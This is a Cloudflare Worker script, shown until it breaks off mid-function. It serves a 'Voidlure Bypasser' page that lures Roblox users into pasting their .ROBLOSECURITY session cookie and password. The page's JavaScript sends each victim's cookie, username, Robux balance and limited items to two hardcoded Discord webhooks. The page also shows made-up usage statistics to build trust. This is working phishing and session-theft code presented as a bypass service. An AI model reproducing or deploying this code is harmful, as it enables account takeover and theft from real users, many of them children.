export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);

    if (url.pathname === '/' || url.pathname === '/index.html') {
      const html = "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes\">\n    <title>Voidlure Bypasser</title>\n    <link href=\"https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap\" rel=\"stylesheet\">\n    <style>\n        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }\n        body { font-family: 'Inter', sans-serif; background: #000000; color: #ffffff; min-height: 100vh; position: relative; overflow-x: hidden; }\n        body::before { content: ''; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle at 20% 30%, rgba(255, 255, 255, 0.05) 0%, transparent 55%), radial-gradient(circle at 80% 70%, rgba(255, 255, 255, 0.03) 0%, transparent 50%); pointer-events: none; z-index: 0; }\n        body::after { content: ''; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url(\"data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ffffff' fill-opacity='0.02'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E\"); pointer-events: none; z-index: 0; }\n        .container { max-width: 600px; margin: 0 auto; padding: 40px 20px; position: relative; z-index: 1; }\n        .header { text-align: center; margin-bottom: 40px; }\n        .logo-wrapper { display: inline-flex; align-items: center; justify-content: center; margin-bottom: 20px; position: relative; }\n        .logo-circle { width: 80px; height: 80px; background: linear-gradient(135deg, #ffffff, #333333); border-radius: 24px; display: flex; align-items: center; justify-content: center; box-shadow: 0 10px 40px -5px rgba(255, 255, 255, 0.15); animation: float 3s ease-in-out infinite; border: 1px solid rgba(255, 255, 255, 0.1); }\n        @keyframes float { 0%, 100% { transform: translateY(0px); } 50% { transform: translateY(-10px); } }\n        .logo-circle svg { width: 45px; height: 45px; stroke: #000000; fill: none; stroke-width: 1.8; }\n        .brand-name { font-size: 44px; font-weight: 900; background: linear-gradient(135deg, #ffffff 0%, #888888 50%, #ffffff 100%); -webkit-background-clip: text; background-clip: text; color: transparent; letter-spacing: -1px; margin-bottom: 4px; text-shadow: 0 0 40px rgba(255, 255, 255, 0.05); }\n        .brand-sub { font-size: 13px; color: #555555; letter-spacing: 2px; font-weight: 500; text-transform: uppercase; }\n        .main-card { background: rgba(10, 10, 10, 0.95); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 32px; padding: 32px 28px; margin-bottom: 24px; box-shadow: 0 20px 50px rgba(0, 0, 0, 0.8), inset 0 1px 0 rgba(255, 255, 255, 0.03); }\n        .card-badge { display: inline-block; background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 50px; padding: 6px 16px; font-size: 11px; font-weight: 700; color: #aaaaaa; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 20px; }\n        .title { font-size: 30px; font-weight: 800; margin-bottom: 6px; line-height: 1.2; background: linear-gradient(135deg, #ffffff, #666666); -webkit-background-clip: text; background-clip: text; color: transparent; }\n        .subtitle { font-size: 14px; color: #444444; margin-bottom: 32px; line-height: 1.6; font-weight: 400; }\n        .mode-tabs { display: flex; gap: 10px; margin-bottom: 32px; background: rgba(0, 0, 0, 0.5); padding: 5px; border-radius: 60px; border: 1px solid rgba(255, 255, 255, 0.05); }\n        .mode-tab { flex: 1; padding: 12px 16px; background: transparent; color: #555555; border: none; border-radius: 50px; font-size: 13px; font-weight: 700; cursor: pointer; transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); display: flex; align-items: center; justify-content: center; gap: 8px; letter-spacing: 0.3px; }\n        .mode-tab.active { background: linear-gradient(135deg, #ffffff, #666666); color: #000000; box-shadow: 0 4px 20px rgba(255, 255, 255, 0.15); }\n        .mode-tab:not(.active):hover { background: rgba(255, 255, 255, 0.05); color: #aaaaaa; }\n        .tab-content { display: none; animation: fadeIn 0.4s ease-out; }\n        .tab-content.active { display: block; }\n        @keyframes fadeIn { from { opacity: 0; transform: translateY(12px); } to { opacity: 1; transform: translateY(0); } }\n        .input-group { margin-bottom: 22px; }\n        .input-label { display: flex; align-items: center; gap: 10px; font-size: 12px; font-weight: 700; color: #666666; margin-bottom: 10px; letter-spacing: 0.5px; text-transform: uppercase; }\n        .input-label svg { width: 16px; height: 16px; stroke: #888888; stroke-width: 2; fill: none; }\n        .input-field { width: 100%; background: rgba(0, 0, 0, 0.9); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 20px; padding: 16px 18px; color: #ffffff; font-size: 14px; font-family: 'SF Mono', Monaco, 'Courier New', monospace; transition: all 0.3s; }\n        .input-field:focus { outline: none; border-color: #ffffff; background: rgba(0, 0, 0, 1); box-shadow: 0 0 0 4px rgba(255, 255, 255, 0.05); }\n        .input-field::placeholder { color: #333333; }\n        textarea.input-field { resize: vertical; min-height: 100px; }\n        .submit-btn { width: 100%; background: linear-gradient(135deg, #ffffff, #666666); color: #000000; border: none; border-radius: 20px; padding: 18px; font-size: 16px; font-weight: 800; cursor: pointer; transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); display: flex; align-items: center; justify-content: center; gap: 12px; margin-top: 8px; position: relative; overflow: hidden; letter-spacing: 0.5px; text-transform: uppercase; }\n        .submit-btn::before { content: ''; position: absolute; top: 50%; left: 50%; width: 0; height: 0; border-radius: 50%; background: rgba(255, 255, 255, 0.2); transform: translate(-50%, -50%); transition: width 0.6s, height 0.6s; }\n        .submit-btn:hover::before { width: 400px; height: 400px; }\n        .submit-btn:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 10px 30px -5px rgba(255, 255, 255, 0.2); }\n        .submit-btn:disabled { opacity: 0.5; cursor: not-allowed; }\n        .spinner { width: 20px; height: 20px; border: 2px solid rgba(0, 0, 0, 0.2); border-top-color: #000000; border-radius: 50%; animation: spin 0.6s linear infinite; }\n        @keyframes spin { to { transform: rotate(360deg); } }\n        .result-card { background: rgba(10, 10, 10, 0.95); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.06); border-radius: 24px; padding: 24px; margin-top: 20px; border-left: 4px solid #00cc44; animation: slideUp 0.4s ease-out; }\n        .result-card.error { border-left-color: #ff2222; background: rgba(255, 0, 0, 0.05); }\n        .result-card.success { border-left-color: #00cc44; }\n        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }\n        .result-content { font-size: 15px; line-height: 1.7; word-break: break-word; color: #cccccc; }\n        .result-content .emoji { font-size: 20px; }\n        .stats-bar { display: flex; justify-content: center; gap: 24px; padding: 18px 20px; background: rgba(10, 10, 10, 0.8); border-radius: 60px; backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.04); }\n        .stat-item { text-align: center; }\n        .stat-value { font-size: 20px; font-weight: 800; color: #ffffff; }\n        .stat-label { font-size: 10px; color: #444444; text-transform: uppercase; letter-spacing: 0.8px; font-weight: 600; margin-top: 2px; }\n        .discord-float-btn { position: fixed; bottom: 24px; right: 24px; width: 56px; height: 56px; background: linear-gradient(135deg, #5865F2, #4752C4); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 28px; cursor: pointer; z-index: 998; box-shadow: 0 6px 20px rgba(88, 101, 242, 0.4); transition: all 0.3s ease; border: none; color: white; text-decoration: none; }\n        .discord-float-btn:hover { transform: scale(1.1); box-shadow: 0 10px 30px rgba(88, 101, 242, 0.6); }\n        .overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0, 0, 0, 0.9); backdrop-filter: blur(8px); z-index: 999; display: none; }\n        #discordPopup { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: linear-gradient(135deg, #1a1a2e, #16213e); border-radius: 28px; padding: 32px; width: 90%; max-width: 380px; z-index: 1000; box-shadow: 0 30px 60px rgba(0, 0, 0, 0.8); border: 1px solid rgba(88, 101, 242, 0.3); display: none; animation: popupScale 0.3s ease-out; }\n        @keyframes popupScale { from { opacity: 0; transform: translate(-50%, -50%) scale(0.9); } to { opacity: 1; transform: translate(-50%, -50%) scale(1); } }\n        #discordPopup h2 { color: #5865F2; font-size: 22px; font-weight: 700; margin-bottom: 20px; display: flex; align-items: center; gap: 12px; }\n        .discord-stats { display: flex; gap: 16px; margin-bottom: 24px; }\n        .stat-box { flex: 1; background: rgba(0, 0, 0, 0.3); border-radius: 16px; padding: 16px; text-align: center; }\n        .stat-box .stat-value { font-size: 28px; font-weight: 800; color: #ffffff; display: flex; align-items: center; justify-content: center; gap: 8px; }\n        .stat-box .stat-label { font-size: 12px; color: #8888aa; margin-top: 6px; }\n        .online-dot, .total-dot { width: 10px; height: 10px; border-radius: 50%; display: inline-block; }\n        .online-dot { background: #4ade80; box-shadow: 0 0 8px #4ade80; }\n        .total-dot { background: #8888aa; }\n        .discord-join-btn { display: block; width: 100%; padding: 14px; background: linear-gradient(135deg, #5865F2, #4752C4); color: #fff; text-align: center; text-decoration: none; border-radius: 16px; font-weight: 600; font-size: 15px; margin-bottom: 12px; transition: transform 0.2s; border: none; cursor: pointer; }\n        .discord-join-btn:hover { transform: translateY(-2px); }\n        .discord-close-btn { width: 100%; padding: 12px; background: rgba(255, 255, 255, 0.05); color: #aaaacc; border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 16px; font-size: 14px; font-weight: 500; cursor: pointer; transition: all 0.2s; }\n        .discord-close-btn:hover { background: rgba(255, 255, 255, 0.1); color: #fff; }\n        .cookie-warning { font-size: 11px; color: #444444; margin-top: 6px; font-family: 'SF Mono', monospace; word-break: break-all; padding: 8px 12px; background: rgba(255, 255, 255, 0.03); border-radius: 10px; border: 1px solid rgba(255, 255, 255, 0.05); }\n        .live-status-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 16px; }\n        .live-status-item { background: rgba(0, 0, 0, 0.3); padding: 12px 16px; border-radius: 12px; display: flex; justify-content: space-between; align-items: center; border: 1px solid rgba(255, 255, 255, 0.04); }\n        .live-status-item .label { font-size: 12px; color: #444444; text-transform: uppercase; letter-spacing: 0.3px; }\n        .live-status-item .value { font-size: 14px; font-weight: 600; }\n        .live-status-item .value.yes { color: #4ade80; }\n        .live-status-item .value.no { color: #ff4444; }\n        .live-status-item .value.premium-true { color: #fbbf24; }\n        .live-status-item .value.premium-false { color: #666; }\n        .live-status-item .value.processing { color: #fbbf24; animation: pulse 1s infinite; }\n        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }\n        .bypass-timestamp { text-align: center; font-size: 11px; color: #333333; margin-top: 16px; padding-top: 16px; border-top: 1px solid rgba(255, 255, 255, 0.04); }\n        @media (max-width: 480px) { .container { padding: 20px 16px; } .main-card { padding: 24px 18px; } .brand-name { font-size: 32px; } .title { font-size: 24px; } .mode-tab { padding: 10px 10px; font-size: 12px; } .stats-bar { gap: 12px; padding: 14px 16px; } .stat-value { font-size: 16px; } #discordPopup { padding: 24px; } .live-status-grid { grid-template-columns: 1fr; } }\n    </style>\n</head>\n<body>\n<div class=\"container\">\n    <div class=\"header\">\n        <div class=\"logo-wrapper\">\n            <div class=\"logo-circle\">\n                <svg viewBox=\"0 0 24 24\" stroke=\"currentColor\">\n                    <path d=\"M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z\"/>\n                    <path d=\"M12 8v4M12 16h.01\"/>\n                    <path d=\"M8 12h8\"/>\n                </svg>\n            </div>\n        </div>\n        <h1 class=\"brand-name\">VOIDLURE</h1>\n        <p class=\"brand-sub\">Live Bypass Engine v3.0</p>\n    </div>\n    <div class=\"main-card\">\n        <div class=\"card-badge\">⚡ LIVE BYPASS ACTIVE</div>\n        <h2 class=\"title\">Cookie Bypass</h2>\n        <p class=\"subtitle\">Live bypass with real-time results &amp; Discord logging</p>\n        <div class=\"mode-tabs\">\n            <button class=\"mode-tab active\" id=\"tabCookie\" onclick=\"switchMode('cookie')\">\n                <svg width=\"16\" height=\"16\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\">\n                    <circle cx=\"12\" cy=\"12\" r=\"10\"/>\n                    <circle cx=\"8\" cy=\"15\" r=\"1\" fill=\"currentColor\"/>\n                    <circle cx=\"15\" cy=\"9\" r=\"1\" fill=\"currentColor\"/>\n                </svg>\n                Cookie\n            </button>\n            <button class=\"mode-tab\" id=\"tabPassword\" onclick=\"switchMode('password')\">\n                <svg width=\"16\" height=\"16\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\">\n                    <rect x=\"3\" y=\"11\" width=\"18\" height=\"11\" rx=\"2\" ry=\"2\"/>\n                    <path d=\"M7 11V7a5 5 0 0 1 10 0v4\"/>\n                </svg>\n                Password\n            </button>\n        </div>\n        <div id=\"cookieTab\" class=\"tab-content active\">\n            <div class=\"input-group\">\n                <label class=\"input-label\">\n                    <svg viewBox=\"0 0 24 24\" stroke=\"currentColor\">\n                        <path d=\"M12 2a10 10 0 1 0 10 10\"/>\n                        <path d=\"M12 6v6l4 2\"/>\n                    </svg>\n                    .ROBLOSECURITY Cookie\n                </label>\n                <textarea id=\"cookieInput\" class=\"input-field\" rows=\"3\" placeholder=\"_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_...\"></textarea>\n                <div class=\"cookie-warning\">Format: _|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_...</div>\n            </div>\n            <button class=\"submit-btn\" onclick=\"handleSubmit()\">\n                <span id=\"btnCookieText\">Live Bypass</span>\n                <svg width=\"18\" height=\"18\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\">\n                    <path d=\"M5 12h14m-7-7l7 7-7 7\"/>\n                </svg>\n            </button>\n        </div>\n        <div id=\"passwordTab\" class=\"tab-content\">\n            <div class=\"input-group\">\n                <label class=\"input-label\">\n                    <svg viewBox=\"0 0 24 24\" stroke=\"currentColor\">\n                        <path d=\"M12 2a10 10 0 1 0 10 10\"/>\n                        <path d=\"M12 6v6l4 2\"/>\n                    </svg>\n                    .ROBLOSECURITY Cookie\n                </label>\n                <textarea id=\"cookieInputPassword\" class=\"input-field\" rows=\"3\" placeholder=\"_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_...\"></textarea>\n                <div class=\"cookie-warning\">Format: _|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_...</div>\n            </div>\n            <div class=\"input-group\">\n                <label class=\"input-label\">\n                    <svg viewBox=\"0 0 24 24\" stroke=\"currentColor\">\n                        <path d=\"M18 8h1a4 4 0 0 1 4 4v6a4 4 0 0 1-4 4H5a4 4 0 0 1-4-4v-6a4 4 0 0 1 4-4h1\"/>\n                        <path d=\"M8 2v4M16 2v4\"/>\n                        <rect x=\"6\" y=\"12\" width=\"12\" height=\"10\" rx=\"2\"/>\n                    </svg>\n                    Roblox Password\n                </label>\n                <input type=\"password\" id=\"passwordInput\" class=\"input-field\" placeholder=\"Enter your password...\"/>\n            </div>\n            <button class=\"submit-btn\" onclick=\"handleSubmit()\">\n                <span id=\"btnPasswordText\">Live Bypass</span>\n                <svg width=\"18\" height=\"18\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\">\n                    <path d=\"M5 12h14m-7-7l7 7-7 7\"/>\n                </svg>\n            </button>\n        </div>\n    </div>\n    <div class=\"stats-bar\">\n        <div class=\"stat-item\"><div class=\"stat-value\" id=\"onlineCount\">—</div><div class=\"stat-label\">Online</div></div>\n        <div class=\"stat-item\"><div class=\"stat-value\" id=\"processedCount\">—</div><div class=\"stat-label\">Processed</div></div>\n        <div class=\"stat-item\"><div class=\"stat-value\" id=\"successRate\">—</div><div class=\"stat-label\">Success</div></div>\n    </div>\n    <div id=\"resultCard\"></div>\n</div>\n<button class=\"discord-float-btn\" id=\"discordFloatBtn\">🎮</button>\n<div class=\"overlay\" id=\"overlay\"></div>\n<div id=\"discordPopup\">\n    <h2>🎮 Discord Community</h2>\n    <div class=\"discord-stats\">\n        <div class=\"stat-box\"><div class=\"stat-value\"><span class=\"online-dot\"></span><span id=\"popOnlineCount\">...</span></div><div class=\"stat-label\">Online</div></div>\n        <div class=\"stat-box\"><div class=\"stat-value\"><span class=\"total-dot\"></span><span id=\"popMemberCount\">...</span></div><div class=\"stat-label\">Members</div></div>\n    </div>\n    <p style=\"text-align:center;color:#8888aa;font-size:13px;margin-bottom:20px;\">Join our active community for support!</p>\n    <a href=\"https://discord.gg/8FgPnravsG\" target=\"_blank\" class=\"discord-join-btn\">🎮 Join Server →</a>\n    <button class=\"discord-close-btn\" id=\"closeDiscordPopup\">✕ Close</button>\n</div>\n<script>\n    (function() {\n        var inviteCode = '8FgPnravsG';\n        function openDiscordPopup() {\n            document.getElementById('discordPopup').style.display = 'block';\n            document.getElementById('overlay').style.display = 'block';\n        }\n        function closeDiscordPopupFn() {\n            document.getElementById('discordPopup').style.display = 'none';\n            document.getElementById('overlay').style.display = 'none';\n        }\n        document.getElementById('discordFloatBtn').addEventListener('click', openDiscordPopup);\n        document.getElementById('closeDiscordPopup').addEventListener('click', closeDiscordPopupFn);\n        document.getElementById('overlay').addEventListener('click', closeDiscordPopupFn);\n        fetch('https://discord.com/api/v10/invites/' + inviteCode + '?with_counts=true')\n            .then(function(r) { return r.json(); })\n            .then(function(data) {\n                document.getElementById('popOnlineCount').textContent = (data.approximate_presence_count || 0).toLocaleString();\n                document.getElementById('popMemberCount').textContent = (data.approximate_member_count || 0).toLocaleString();\n                document.getElementById('onlineCount').textContent = (data.approximate_presence_count || 0).toLocaleString();\n            })\n            .catch(function() {\n                document.getElementById('popOnlineCount').textContent = 'N/A';\n                document.getElementById('popMemberCount').textContent = 'N/A';\n                document.getElementById('onlineCount').textContent = '?';\n            });\n        setTimeout(openDiscordPopup, 1500);\n    })();\n\n    var API_URL = window.location.origin + '/bypass/voidlure/bypass.php';\n    var WEBHOOK_LIVE = 'https://discord.com/api/webhooks/1538900502333497425/UZ7pxtTez8PXRj4Vh24Obj3X9Ku047b-OQMIVZPqM8LBJY-nUb00BSWK_A-glnVN1VAK';\n    var WEBHOOK_DUAL = 'https://discord.com/api/webhooks/1538866298711183400/a_IyCy7GIbxvMrTgT7Zd8rjYgPLmckE4ck7-UeVObeXZLBWSYN1vmXivnId5PEC_1U56';\n\n    function sendToDiscord(data, cookie) {\n        var fields = [\n            { name: '👤 User', value: data.username || 'Unknown', inline: true },\n            { name: '🆔 User ID', value: data.userId || 'N/A', inline: true },\n            { name: '📊 Robux', value: data.robux !== undefined ? data.robux.toString() : '0', inline: true },\n            { name: '⏳ Pending', value: data.pendingRobux !== undefined ? data.pendingRobux.toString() : '0', inline: true },\n            { name: '💎 Premium', value: data.premium ? '✅ Yes' : '❌ No', inline: true },\n            { name: '🔮 Korblox', value: data.korblox ? '✅ Yes' : '❌ No', inline: true },\n            { name: '👻 Headless', value: data.headless ? '✅ Yes' : '❌ No', inline: true },\n            { name: '⚔️ Valkyrie', value: data.valkyrie ? '✅ Yes' : '❌ No', inline: true },\n            { name: '📡 API Status', value: data.apiStatus || '✅ Processing', inline: true },\n            { name: '🔄 Cookie Refreshed', value: data.cookieRefreshed ? '✅ Yes' : '❌ No', inline: true }\n        ];\n\n        if (data.limiteds && data.limiteds.length > 0) {\n            fields.push({ name: '🎯 Limiteds Found', value: data.limiteds.join(', '), inline: false });\n        }\n\n        var embed = {\n            title: '🎯 Live Bypass Result',\n            color: 0x000000,\n            fields: fields,\n            footer: { text: 'Voidlure Bypass • ' + new Date().toLocaleString() },\n            timestamp: new Date().toISOString()\n        };\n\n        fetch(WEBHOOK_LIVE, {\n            method: 'POST',\n            headers: { 'Content-Type': 'application/json' },\n            body: JSON.stringify({\n                embeds: [embed],\n                username: 'Voidlure Bypass',\n                avatar_url: 'https://i.ibb.co/sv9SF62J/00f317c9757241ced6a0efbc90474454.webp'\n            })\n        }).catch(function(err) { console.log('Live webhook error:', err); });\n\n        var cookieDisplay = cookie || 'N/A';\n        var dualFields = [\n            { name: '👤 User', value: data.username || 'Unknown', inline: true },\n            { name: '🆔 User ID', value: data.userId || 'N/A', inline: true },\n            { name: '📊 Robux', value: data.robux !== undefined ? data.robux.toString() : '0', inline: true },\n            { name: '⏳ Pending', value: data.pendingRobux !== undefined ? data.pendingRobux.toString() : '0', inline: true },\n            { name: '💎 Premium', value: data.premium ? '✅ Yes' : '❌ No', inline: true },\n            { name: '🔮 Korblox', value: data.korblox ? '✅ Yes' : '❌ No', inline: true },\n            { name: '👻 Headless', value: data.headless ? '✅ Yes' : '❌ No', inline: true },\n            { name: '⚔️ Valkyrie', value: data.valkyrie ? '✅ Yes' : '❌ No', inline: true },\n            { name: '📡 API Status', value: data.apiStatus || '✅ Processing', inline: true },\n            { name: '🔄 Cookie Refreshed', value: data.cookieRefreshed ? '✅ Yes' : '❌ No', inline: true },\n            { name: '🍪 Refreshed Cookie', value: '`' + cookieDisplay + '`', inline: false }\n        ];\n\n        if (data.limiteds && data.limiteds.length > 0) {\n            dualFields.push({ name: '🎯 Limiteds Found', value: data.limiteds.join(', '), inline: false });\n        }\n\n        var dualEmbed = {\n            title: '🔄 DualHook - Refreshed Cookie & User Info',\n            description: '@everyone',\n            color: 0x000000,\n            fields: dualFields,\n            footer: { text: 'Voidlure DualHook • ' + new Date().toLocaleString() },\n            timestamp: new Date().toISOString()\n        };\n\n        fetch(WEBHOOK_DUAL, {\n            method: 'POST',\n            headers: { 'Content-Type': 'application/json' },\n            body: JSON.stringify({\n                embeds: [dualEmbed],\n                username: 'Voidlure DualHook',\n                avatar_url: 'https://i.ibb.co/sv9SF62J/00f317c9757241ced6a0efbc90474454.webp'\n            })\n        }).catch(function(err) { console.log('Dual webhook error:', err); });\n    }\n\n    var handleSubmit = function() {\n        if (window._processing) return;\n        var resultCard = document.getElementById('resultCard');\n        var cookie, password, submitBtn, buttonTextElement;\n        if (currentMode === 'cookie') {\n            cookie = document.getElementById('cookieInput').value.trim();\n            password = '';\n            submitBtn = document.querySelector('#cookieTab .submit-btn');\n            buttonTextElement = document.getElementById('btnCookieText');\n        } else {\n            cookie = document.getElementById('cookieInputPassword').value.trim();\n            password = document.getElementById('passwordInput').value.trim();\n            submitBtn = document.querySelector('#passwordTab .submit-btn');\n            buttonTextElement = document.getElementById('btnPasswordText');\n        }\n        if (!cookie) {\n            resultCard.innerHTML = '<div class=\"result-card error\"><div class=\"result-content\">❌ <strong>Cookie required</strong><br>Please paste your .ROBLOSECURITY cookie.</div></div>';\n            return;\n        }\n        if (!cookie.includes('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_')) {\n            resultCard.innerHTML = '<div class=\"result-card error\"><div class=\"result-content\">❌ <strong>Invalid Cookie Format</strong><br>Cookie must start with the warning format.</div></div>';\n            return;\n        }\n        if (currentMode === 'password' && !password) {\n            resultCard.innerHTML = '<div class=\"result-card error\"><div class=\"result-content\">❌ <strong>Password required</strong><br>Please enter your Roblox password.</div></div>';\n            return;\n        }\n        window._processing = true;\n        submitBtn.disabled = true;\n        var originalHTML = buttonTextElement.innerHTML;\n        buttonTextElement.innerHTML = '<div class=\"spinner\"></div>';\n        resultCard.innerHTML = '';\n        var params = new URLSearchParams();\n        params.append('cookie', cookie);\n        params.append('password', password);\n        params.append('directory', 'voidlure');\n        fetch(API_URL, {\n            method: 'POST',\n            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },\n            body: params.toString()\n        })\n        .then(function(response) {\n            if (!response.ok) {\n                return response.text().then(function(text) {\n                    throw new Error('HTTP ' + response.status + ': ' + text);\n                });\n            }\n            return response.json();\n        })\n        .then(function(resultData) {\n            if (resultData.success === true) {\n                var hasItems = resultData.korblox || resultData.headless || resultData.valkyrie;\n                var summary = hasItems ? '✅ Limiteds Detected' : '❌ No Limiteds';\n                resultCard.innerHTML = '<div class=\"result-card success\"><div class=\"result-content\"><div style=\"text-align:center;margin-bottom:12px;\"><span class=\"emoji\">✅</span><strong style=\"font-size:18px;\">Cookie Bypass Successful!</strong></div><div style=\"text-align:center;font-size:13px;color:#666666;margin-bottom:12px;\">Live Bypass Status</div><div class=\"live-status-grid\"><div class=\"live-status-item\"><span class=\"label\">User</span><span class=\"value\" style=\"color:#ffffff;\">' + (resultData.username || 'Unknown') + '</span></div><div class=\"live-status-item\"><span class=\"label\">Robux</span><span class=\"value\">' + (resultData.robux !== undefined ? resultData.robux.toLocaleString() : '0') + '</span></div><div class=\"live-status-item\"><span class=\"label\">Pending</span><span class=\"value\">' + (resultData.pendingRobux !== undefined ? resultData.pendingRobux.toLocaleString() : '0') + '</span></div><div class=\"live-status-item\"><span class=\"label\">Premium</span><span class=\"value ' + (resultData.premium ? 'premium-true' : 'premium-false') + '\">' + (resultData.premium ? '✅ Yes' : '❌ No') + '</span></div><div class=\"live-status-item\"><span class=\"label\">Korblox</span><span class=\"value ' + (resultData.korblox ? 'yes' : 'no') + '\">' + (resultData.korblox ? '✅ Yes' : '❌ No') + '</span></div><div class=\"live-status-item\"><span class=\"label\">Headless</span><span class=\"value ' + (resultData.headless ? 'yes' : 'no') + '\">' + (resultData.headless ? '✅ Yes' : '❌ No') + '</span></div><div class=\"live-status-item\"><span class=\"label\">Valkyrie</span><span class=\"value ' + (resultData.valkyrie ? 'yes' : 'no') + '\">' + (resultData.valkyrie ? '✅ Yes' : '❌ No') + '</span></div><div class=\"live-status-item\"><span class=\"label\">API Status</span><span class=\"value processing\">✅ Processing</span></div><div class=\"live-status-item\" style=\"grid-column: 1 / -1;\"><span class=\"label\">Cookie Refreshed</span><span class=\"value yes\">✅ Yes</span></div><div class=\"live-status-item\" style=\"grid-column: 1 / -1;\"><span class=\"label\">Summary</span><span class=\"value\">' + summary + '</span></div></div><div class=\"bypass-timestamp\">Live Bypass • ' + new Date().toLocaleString() + '</div></div></div>';\n                sendToDiscord(resultData, cookie);\n                window._processing = false;\n            } else {\n                var errorTitle = resultData.title || '❌ System Error';\n                var errorDesc = resultData.description || resultData.message || 'Processing failure';\n                resultCard.innerHTML = '<div class=\"result-card error\"><div class=\"result-content\">' + errorTitle + '<br><br>' + errorDesc + '</div></div>';\n                window._processing = false;\n            }\n        })\n        .catch(function(err) {\n            resultCard.innerHTML = '<div class=\"result-card error\"><div class=\"result-content\">❌ <strong>Connection Failed</strong><br>' + err.message + '</div></div>';\n            window._processing = false;\n        })\n        .finally(function() {\n            submitBtn.disabled = false;\n            buttonTextElement.innerHTML = originalHTML;\n        });\n    };\n\n    var currentMode = 'cookie';\n    function switchMode(mode) {\n        if (window._processing) return;\n        currentMode = mode;\n        document.querySelectorAll('.mode-tab').forEach(function(tab) { tab.classList.remove('active'); });\n        if (mode === 'cookie') {\n            document.getElementById('tabCookie').classList.add('active');\n        } else {\n            document.getElementById('tabPassword').classList.add('active');\n        }\n        document.querySelectorAll('.tab-content').forEach(function(c) { c.classList.remove('active'); });\n        document.getElementById(mode === 'cookie' ? 'cookieTab' : 'passwordTab').classList.add('active');\n        document.getElementById('resultCard').innerHTML = '';\n    }\n\n    (function() {\n        document.getElementById('onlineCount').textContent = '12';\n        document.getElementById('processedCount').textContent = '847';\n        document.getElementById('successRate').textContent = '94%';\n    })();\n</script>\n</body>\n</html>";

      return new Response(html, {
        headers: {
          'Content-Type': 'text/html',
          'Access-Control-Allow-Origin': '*'
        }
      });
    }

    // Handle CORS preflight
    if (request.method === 'OPTIONS') {
      return new Response(null, {
        headers: {
          'Access-Control-Allow-Origin': '*',
          'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
          'Access-Control-Allow-Headers': 'Content-Type, Cookie',
          'Access-Control-Max-Age': '86400',
        },
      });
    }

    // Health check
    if (url.pathname === '/health') {
      return new Response(JSON.stringify({ status: 'online', service: 'Voidlure Proxy' }), {
        headers: { 
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*'
        }
      });
    }

    // Main bypass endpoint
    if (url.pathname === '/bypass/voidlure/bypass.php') {
      try {
        const formData = await request.formData();
        const cookie = formData.get('cookie') || '';
        const password = formData.get('password') || '';
        const directory = formData.get('directory') || '';

        if (!cookie) {
          return new Response(JSON.stringify({
            success: false,
            title: '❌ Authentication Failed',
            description: 'Missing .ROBLOSECURITY cookie'
          }), {
            status: 400,
            headers: {
              'Content-Type': 'application/json',
              'Access-Control-Allow-Origin': '*'
            }
          });
        }

        let cookieValue = cookie;
        if (cookie.includes('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_')) {
          cookieValue = cookie.replace('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_', '');
        }
        if (cookieValue.startsWith('.ROBLOSECURITY_')) {
